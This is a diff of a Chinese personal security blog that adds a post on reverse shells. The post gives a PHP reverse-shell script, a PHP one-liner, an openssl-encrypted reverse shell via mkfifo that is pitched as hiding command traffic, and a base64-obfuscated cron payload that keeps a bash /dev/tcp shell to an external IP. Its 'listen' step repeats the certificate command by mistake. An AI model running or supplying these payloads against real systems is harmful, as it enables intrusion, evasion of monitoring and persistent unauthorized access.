@@ -6,19 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://geeeez.github.io">
-  <title>Tag: app | geez博客</title>
+  <title>关于反弹shell的那些事 | geez博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="个人笔记博客">
-<meta name="keywords" content="安全,白帽子,黑客,诗人">
-<meta property="og:type" content="website">
-<meta property="og:title" content="geez博客">
-<meta property="og:url" content="https://geeeez.github.io/tags/app/index.html">
+  <meta name="description" content="反弹shell">
+<meta name="keywords" content="web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于反弹shell的那些事">
+<meta property="og:url" content="https://geeeez.github.io/2018/06/01/关于反弹shell的那些事/index.html">
 <meta property="og:site_name" content="geez博客">
-<meta property="og:description" content="个人笔记博客">
+<meta property="og:description" content="反弹shell">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-08-29T10:13:33.243Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="geez博客">
-<meta name="twitter:description" content="个人笔记博客">
+<meta name="twitter:title" content="关于反弹shell的那些事">
+<meta name="twitter:description" content="反弹shell">
   
     <link rel="alternative" href="/atom.xml" title="geez博客" type="application/atom+xml">
   
@@ -176,60 +177,239 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-关于反弹shell的那些事" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/03/01/adb的简单使用/" class="archive-article-date">
-  	<time datetime="2019-03-01T04:12:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-01</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/03/01/adb的简单使用/">adb工具的使用笔记</a>
+    <h1 class="article-title" itemprop="name">
+      关于反弹shell的那些事
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2018/06/01/关于反弹shell的那些事/" class="archive-article-date">
+  	<time datetime="2018-06-01T04:12:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-01</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="众所周知的反弹shell"><a href="#众所周知的反弹shell" class="headerlink" title="众所周知的反弹shell"></a>众所周知的反弹shell</h4><hr>
+<p>我们拿到webshell后如果想进一步搞事情，那么肯定绕不过反弹shell。即使有蚁剑，菜刀这样的神器，但是非交互式的shell仍有很多不好用的地方。<br>先说反弹shell吧，反弹shell的方法很多，各个语言有各个语言的方式，这里不是为了介绍这些的，当然还是贴一个大佬朋友的博客<a href="https://www.kkzevip.com/?post=21" target="_blank" rel="noopener">&gt;点击这里&lt;</a>，你们可以去上面看看他的总结。<br>另外，补充一个显示生活中非常好用的php反弹shell的脚本，可以说我用这个脚本反弹从来没失败过。<br>代码如下，改好ip+port运行即可：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$sock = fsockopen($ip, $port);</span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">        <span class="number">0</span> =&gt; $sock,</span><br><span class="line">        <span class="number">1</span> =&gt; $sock,</span><br><span class="line">        <span class="number">2</span> =&gt; $sock</span><br><span class="line">);</span><br><span class="line">$process = proc_open(<span class="string">'/bin/sh'</span>, $descriptorspec, $pipes);</span><br><span class="line">proc_close($process);</span><br></pre></td></tr></table></figure>
+
+<p>真的是比网上的那些php反弹shell（比如：php -r ‘$sock=fsockopen(“10.0.0.1”,1234);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’）成功率高很多。当然此方法也有限制，限制就是系统没有禁用 proc_popen(默认不禁用)。</p>
+<h4 id="加密的反弹shell"><a href="#加密的反弹shell" class="headerlink" title="加密的反弹shell"></a>加密的反弹shell</h4><hr>
+<p>这个是源于看freebuf的一篇文章，后来才知道原来ssl也可以进行反弹shell的加密。这样我们执行的命令流量就不能被分析出来了（在实战中可能有更大的用处，毕竟留痕更少）。</p>
+<ul>
+<li><p>1 首先，vps上生成SSL证书的公私钥对</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>2 在自己的VPS上监听反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>3 在目标上用openssl加密反弹shell的流量</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/s;/bin/bash -i &lt; /tmp/s 2&gt;&amp;1|openssl s_client -quiet -connect vps:443 &gt; /tmp/s;rm /tmp/s</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>你可以自己去抓包分析，对比加密反弹和常规反弹包，可以很清楚的知道加密的流量包是分析不出来我们执行了那些命令的。而且由于mkfifo 系统大多数系统自带，所以绝大多数都可以使用这种方式来反弹加密的shell流量。</p>
+<h4 id="利用cron的反弹shell"><a href="#利用cron的反弹shell" class="headerlink" title="利用cron的反弹shell"></a>利用cron的反弹shell</h4><hr>
+<p>有时候我们还没拿到webshell，这时也并一定就没法反弹一个shell出来。这里分享一个例子：<br>曾经有次渗透测试java web网站，网站存在任意文件上传，但是上传的jsp无法执行，可能是需要编译部署后才可执行（黑盒，具体原因现在也没搞清），所以需要其他的思路来拿shell，当时就是利用的任意文件上传cron。</p>
+<p>当然如果有webshell 也可以用cron维持权限：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=system(<span class="string">'echo ZWNobyAiKiAqICogKiAqIGJhc2ggLWMgJ3tlY2hvLGJhc2ggLWkgPiYgL2Rldi90Y3AvMTE4Ljg5LjIzMy44OS85OTk5IDA+JjF9fHtiYXNlNjQsLWR9fHtiYXNoLC1pfSciIHxjcm9udGFiIC0= |base64 -d|bash -i'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>对crontab不了解的同学可以去深入学习下crontab的结构和知识（很简单的）。</p>
+<h4 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h4><hr>
+<p>上面的都是讲反弹shell，那么反弹shell后怎么拿到一个交互式的shell呢？(ctrl+c断不掉的那种)</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>打多打少是个缘<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/alipay.png">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/wxpay.png">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">app</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://geeeez.github.io/2018/06/01/关于反弹shell的那些事/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2019/03/01/adb的简单使用/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          adb工具的使用笔记
+        
+      </div>
+    </a>
   
   
-    </div></section>
+    <a href="/2018/06/01/浅谈PHP的反序列化/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">浅谈 php反序列化</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" class="comments">
+      <style>
+        .comments{margin:30px;padding:10px;background:#fff}
+        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+      </style>
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "rnolfjaY9NXE3HOy4SKCAzLz-MdYXbMMI",
+            app_key: "jaiqeYfdvtfeikFDzIkRwUDI",
+            placeholder: "Just go go",
+            avatar:"mm"
+        });
+    }
+</script>
+  </section>
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -253,9 +433,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
